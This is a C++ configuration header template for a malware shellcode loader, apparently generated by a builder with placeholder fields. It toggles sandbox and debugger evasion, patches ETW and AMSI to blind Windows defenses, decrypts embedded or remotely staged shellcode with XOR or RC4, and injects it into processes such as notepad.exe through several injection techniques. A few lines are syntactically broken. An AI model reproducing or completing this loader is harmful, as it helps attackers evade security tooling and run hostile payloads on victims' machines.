#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED {{antisandbox}}

//
// TODO:
// Add Ekko
// Add Foliage
//
#define SLEEP_TIME {{ antisandbox_sleep_time }}
#define SLEEP_METHOD 1
#if SLEEP_METHOD == 1
#define SleepMethod(sleep_time) malapi::SleepMs(sleep_time)
#endif

// Patching
#define PATCH_ENABLED_ETW 1

#define PATCH_METHOD_ETW 1
#if PATCH_METHOD_ETW == 1
#define PatchEtw(void) malapi::PatchEtwSsn(void)
#elif PATCH_METHOD_ETW == 2
#define PatchEtw(void) malapi::PatchEtwEventWrite(void)
#endif

#define PATCH_ENABLED_AMSI 1
#define PATCH_METHOD_AMSI 1

// Anti Debugging
#define ANTI_DEBUG_ENABLED 1

#define DEBUG_IS_BEING_DEBUGGED 1
#define DEBUG_REMOTE_DEBUGGING 1

// Encryption

unsigned char key[] = { {{key}} };

#define CONFIG_ENCRYPTION_METHOD {{decryptmethod}}
#if CONFIG_ENCRYPTION_METHOD == 1
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::NONE(shellcode, shellcode_len, key, key_len) // No Decrypt
#elif CONFIG_ENCRYPTION_METHOD == 2
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::XOR(shellcode, shellcode_len, key, key_len) // XOR Decrypt
#elif CONFIG_ENCRYPTION_METHOD == 3
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::RC4(shellcode, shellcode_len, key, key_len) // RC4 Decrypt
#endif

// Obfuscation
#define CONFIG_OBFUSCATION_METHOD 1

// Payloads

//
// 1 - Stageless
// 2 - Staged
//
#define CONFIG_STAGE_METHOD {{stagemethod}}

#if CONFIG_STAGE_METHOD == 1
unsigned char shellcode[] = { {{shellcode}} };
#else
#define STAGER_SSL {{stagessl}}
#define STAGER_URL L"{{stageurl}}"
#define STAGER_FILE L"/{{stagefile}}"
#endif

// Targets List
// Accept user input for a list of processes to inject into

//
// 1 - Create Suspended Process
// 2 - Thread to Address of Entry Point
// 3 - Existing Process
//
#define CONFIG_CREATE_PROCESS_METHOD 3

#if CONFIG_CREATE_PROCESS_METHOD == 1 or CONFIG_CREATE_PROCESS_METHOD == 2
#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\WerFault.exe"
//#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
#else
#define  constexpr ULONG targets[] = { malapi::HashStringFowlerNollVoVariant1a("notepad.exe") };
#endif

// Execution Methods
{
#define CONFIG_EXECUTION_METHOD {{method}}

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionRemoteHijack(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 3
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionAddressOfEntryPoint(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 4
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 5
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionDoppleganger(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 6
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionQueueUserAPC(phandle, shellcode, shellcode_len, ahandle)
#endif

	//
	// 1 - Normal Executable
	// 2 - DLL
	// 3 - Service Binary (In Progress)
	//
#define CONFIG_COMPILATION_OPTION {{binaryformat}}

#endif
